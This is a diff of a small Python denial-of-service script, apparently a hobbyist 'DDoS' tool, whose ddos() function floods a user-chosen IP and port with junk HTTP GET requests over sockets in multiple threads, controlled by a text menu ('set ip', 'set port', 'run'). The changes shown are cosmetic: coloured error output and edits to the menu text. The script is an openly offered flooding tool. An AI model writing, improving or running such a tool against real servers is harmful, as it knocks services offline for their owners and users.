@@ -12,7 +12,7 @@ def ddos():
           mysocket.send(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"))
           mysocket.sendto(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"), (ip, port))
       except socket.error:
-         print("error")
+         print("\033[1;32;40merror")
          mysocket.close()
 
    for i in range(threads):
@@ -51,10 +51,9 @@ while i < 6:
     set port    = Set the port (set port) (Best=80)
     set threads = Set the number of threads (set threads) (Best=8) (=!Not working yet!)
     set ip      = Set the ip (set ip)
+    get ip      = Get ip of website (get ip).  
     get ip      = Get ip of website (get ip)
-    get port w  = Get port of website.
-    get port i  = Get port of ip.
-    run         = To Run
+    run         = To run
     quit        = Quit ; Exit
     
     To stop running attack >>> [Crtl + z]
@@ -93,6 +92,6 @@ while i < 6:
       ddos()
       
    else:
-      print("""
+      print("""\033[1;32;40m
       Error
       """)
